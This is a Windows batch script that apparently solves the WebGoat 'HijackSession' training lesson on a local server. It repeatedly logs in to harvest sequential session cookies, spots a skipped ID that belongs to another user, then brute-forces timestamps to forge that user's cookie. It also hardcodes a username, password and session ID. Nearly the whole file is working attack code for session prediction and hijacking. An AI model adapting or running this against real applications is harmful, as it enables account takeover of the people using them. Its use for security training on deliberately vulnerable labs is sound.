@echo off
setlocal enabledelayedexpansion

REM Configuration
set username=nooniman
set password=Demon1%%40%%21
set JSESSIONID=680161EACF97616C1CB41FF9F99DB133

REM Variables
set sessionFoundId=0
set sessionFoundStartTime=0
set sessionFoundEndTime=0
set currentSessionId=0
set previousSessionId=0
set currentSessionTimestamp=0
set previousSessionTimestamp=0

echo ================= Searching for session ==================================
echo.

REM Loop through requests 1 to 1000
for /L %%r in (1,1,1000) do (
    
    REM Make curl request and save to temp file
    curl.exe -s -i -X POST "http://localhost:8001/WebGoat/HijackSession/login?username=!username!&password=!password!" -H "Cookie: JSESSIONID=!JSESSIONID!;" > "%TEMP%\curl_output.txt" 2>&1
    
    REM Extract hijack_cookie value from temp file
    set "currentSession="
    for /f "tokens=*" %%a in ('type "%TEMP%\curl_output.txt" ^| findstr /C:"hijack_cookie" ^| findstr /V "< Set-Cookie:"') do (
        set "line=%%a"
        REM Extract cookie value (between = and ;)
        for /f "tokens=2 delims==" %%b in ("!line!") do (
            for /f "tokens=1 delims=;" %%c in ("%%b") do (
                set "currentSession=%%c"
            )
        )
    )
    
    REM Parse session ID and timestamp only if currentSession is not empty
    if not "!currentSession!"=="" (
        for /f "tokens=1 delims=-" %%d in ("!currentSession!") do set "currentSessionId=%%d"
        for /f "tokens=2 delims=-" %%e in ("!currentSession!") do set "currentSessionTimestamp=%%e"
    )
    
    echo !currentSessionId! - !currentSessionTimestamp!
    
    REM Check if previousSessionId is set and not zero
    if not "!previousSessionId!"=="0" if not "!previousSessionId!"=="" (
        if not "!currentSessionId!"=="" if not "!currentSessionId!"=="0" (
            set /a diff=!currentSessionId! - !previousSessionId!
            if !diff! equ 2 (
                echo.
                echo Session found: !previousSessionId! - !currentSessionId!
                echo.
                set /a sessionFoundId=!previousSessionId! + 1
                set sessionFoundStartTime=!previousSessionTimestamp!
                set sessionFoundEndTime=!currentSessionTimestamp!
                goto :session_found
            )
        )
    )
    
    set previousSessionId=!currentSessionId!
    set previousSessionTimestamp=!currentSessionTimestamp!
)

:session_found
echo.
echo ================= Session Found: !sessionFoundId! =================
echo.
echo ^| From timestamps !sessionFoundStartTime! to !sessionFoundEndTime! ^|
echo.
echo ================= Starting session for !sessionFoundId! at !sessionFoundStartTime! =================
echo.

REM Loop through timestamps
for /L %%t in (!sessionFoundStartTime!,1,!sessionFoundEndTime!) do (
    
    REM Make request with hijacked cookie
    curl.exe -s -X POST "http://localhost:8001/WebGoat/HijackSession/login?username=!username!&password=!password!" -H "Cookie: JSESSIONID=!JSESSIONID!; hijack_cookie=!sessionFoundId!-%%t;secure;" > "%TEMP%\curl_output2.txt" 2>&1
    
    set "response="
    for /f "tokens=*" %%f in ('type "%TEMP%\curl_output2.txt" ^| findstr /C:"feedback"') do (
        set "feedbackLine=%%f"
        REM Extract feedback value (after first colon)
        for /f "tokens=2* delims=:" %%g in ("!feedbackLine!") do (
            set "response=%%g"
        )
    )
    
    echo !sessionFoundId!-%%t: !response!
)

REM Cleanup temp files
if exist "%TEMP%\curl_output.txt" del "%TEMP%\curl_output.txt"
if exist "%TEMP%\curl_output2.txt" del "%TEMP%\curl_output2.txt"

endlocal
